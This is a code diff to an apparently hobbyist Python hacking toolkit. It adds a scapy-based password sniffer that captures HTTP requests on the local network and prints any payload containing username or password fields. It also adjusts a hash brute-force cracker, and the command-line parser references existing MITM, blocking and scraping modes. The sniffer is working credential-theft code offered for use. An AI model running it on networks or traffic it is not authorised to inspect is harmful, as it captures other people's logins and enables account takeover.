@@ -21,6 +21,7 @@ import threading
 import random
 import scapy.all as scapy
 import eel
+from scapy.layers import http
 
 
 def getNetworkIp():
@@ -119,6 +120,33 @@ class DirSearch():
         while not self.done:
             pass
 
+class PasswordSniffer():
+    def __init__(self) -> None:
+        self.keys = ['uname', 'usr', 'name', 'username', 'password', 'passwd']
+
+    def filter(self, packet:scapy.Packet):
+        return packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw)
+
+    def todo(self, packet:scapy.Packet):
+        print(f'[+] HTTP Request <{packet[http.HTTPRequest].Host.decode()}{packet[http.HTTPRequest].Path.decode()}>')
+        load = packet[scapy.Raw].load
+        for key in self.keys:
+            if key in load.decode():
+                print(colored("[+] Found! >> ", 'green',
+                attrs=['bold']) +load.decode())
+
+    def stopFilter(self, packet:scapy.Packet):
+        try:
+            while True:
+                pass
+        except KeyboardInterrupt:
+            return True
+
+    def start(self):
+        scapy.sniff(lfilter=self.filter, prn=self.todo, stop_filter=self.stopFilter)  
+        os.system("clear")
+        print(colored("[-] Closed.", 'red', attrs=['bold']))
+        exit(0)
 
 class Cracker():
     def __init__(self, h, wordlist) -> None:
@@ -164,7 +192,7 @@ class Cracker():
     def bruteForce(self, chars: list):
         for word in self.genWord(chars, max_length=12):
             if self.hash == self.activate(word.encode()).hexdigest():
-                print(word)
+                print(colored(f"Found >> {word}", "green", attrs=["bold"]))
                 self.found = True
 
     def start(self):
@@ -194,7 +222,7 @@ class Cracker():
         t.start()
         while not self.found:
             pass
-
+        exit(0)
 
 class EmailScraper():
     def __init__(self, url: str, filename: str, count: int, verbose: bool, check: bool) -> None:
@@ -435,6 +463,8 @@ def getArgs():
                         help="Specify the target URL you want to scan!")
     parser.add_argument("-c", "--crack", dest="crack",
                         help="Specify the [MD5 / SHA256] hash you want to crack!")
+    parser.add_argument("-ps", "--password-snifer", dest="ps", action="store_true",
+                        help="Specify If You Want To Use Password Sniffer!")
     parser.add_argument("-l", "--web-logger", dest="logger", action="store_true",
                         help="Specify If You Want To Use Web Logger!")
     parser.add_argument("-g", "--gui", dest="gui", action="store_true",
@@ -442,20 +472,22 @@ def getArgs():
     opt = parser.parse_args()
     if opt.gui:
         return "gui"
-    elif opt.scan and not (opt.scrape or opt.block or opt.mitm or opt.path or opt.crack or opt.logger):
+    elif opt.scan and not (opt.scrape or opt.block or opt.mitm or opt.path or opt.crack or opt.logger or opt.ps):
         return "scan", opt.scan
-    elif opt.block and not (opt.scrape or opt.scan or opt.mitm or opt.path or opt.crack or opt.logger):
+    elif opt.block and not (opt.scrape or opt.scan or opt.mitm or opt.path or opt.crack or opt.logger or opt.ps):
         return "block", opt.block
-    elif opt.mitm and not (opt.scrape or opt.block or opt.scan or opt.path or opt.crack or opt.logger):
+    elif opt.mitm and not (opt.scrape or opt.block or opt.scan or opt.path or opt.crack or opt.logger or opt.ps):
         return "mitm", opt.mitm
-    elif opt.scrape and not (opt.scan or opt.block or opt.mitm or opt.path or opt.crack or opt.logger):
+    elif opt.scrape and not (opt.scan or opt.block or opt.mitm or opt.path or opt.crack or opt.logger or opt.ps):
         return "scrape", opt.scrape
-    elif opt.path and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.crack or opt.logger):
+    elif opt.path and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.crack or opt.logger or opt.ps):
         return "pathscanner", opt.path
-    elif opt.crack and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.logger):
+    elif opt.crack and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.logger or opt.ps):
         return "crack", opt.crack
-    elif opt.logger and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.crack):
+    elif opt.logger and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.crack or opt.ps):
         return "logger", opt.logger
+    elif opt.ps and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.crack):
+        return "sniff", opt.ps
     else:
         if opt.scrape or opt.block or opt.mitm or opt.scan:
             print(colored("\t[!] You Can Only Use One Flag At A Time.", "red"))
@@ -546,12 +578,16 @@ def main():
             print(colored("[+] Action Stopped By The User.",
                   "red", attrs=["bold"]))
             exit(0)
+    elif command == 'sniff':
+        print(colored("[+] Starting Password Sniffer.\n", "yellow"))
+        s = PasswordSniffer()
+        s.start()
 
 
 if __name__ == "__main__":
     if getArgs() == "gui":
         print(colored("[+] Running GUI Application.", "green", attrs=["bold"]))
-        eel.init('/usr/local/bin//www')
+        eel.init('/usr/local/bin/www')
         eel.start("index.html", size=(1224, 600), position=(300, 200))
     else:
         main()
